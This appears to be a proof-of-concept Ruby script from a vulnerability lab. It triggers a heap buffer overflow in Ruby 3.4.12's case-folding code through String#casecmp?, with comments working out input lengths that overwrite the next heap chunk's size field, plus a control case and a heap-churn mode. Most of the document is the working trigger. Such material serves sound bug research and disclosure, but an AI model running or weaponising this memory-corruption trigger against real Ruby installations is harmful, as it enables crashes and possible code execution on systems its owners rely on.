# W362: casecmp? entry point into the single-byte case_map overflow.
# String#casecmp? folds BOTH operands with downcase(:fold) before comparing
# (string.c str_casecmp_p), so an ISO-8859-1 string with N x 0xDF after one
# leading 'a' drives the same rb_str_casemap buffer as W361's downcase(:fold).
# One leading 'a' + N x 0xDF gives capa = N+21; R = capa+24 = N+45. At
# N=27/43/59, R=72/88/104 == 8 (mod 16): the successor chunk's size LSB.
# N=28 is the even-capa control (no header slot write).
# The comparison string has the same folded byte length (1+2N) and is
# ASCII, so the fold runs to completion; 'mismatch' changes only its first
# byte and still folds both operands.
# Run: lab/build/plain/ruby-3.4.12-plain/bin/ruby <this> 27 match [churn]
n = (ARGV[0] || 27).to_i
mode = ARGV[1] || 'match'
s = ("a".b + "\xDF".b * n)
s.force_encoding(Encoding::ISO_8859_1)
other = ((mode == 'mismatch' ? "b" : "a") + "s" * (2 * n)).b
result = s.casecmp?(other)
print "N=#{n} casecmp #{mode} result=#{result}\n"
if ARGV[2] == 'churn'
  3000.times { (Array.new(200) { "payload#{object_id}" }).join }
  a = []
  500.times { a << ("x" * 64) }
  GC.start
  print "N=#{n} casecmp #{mode} churn ok\n"
end
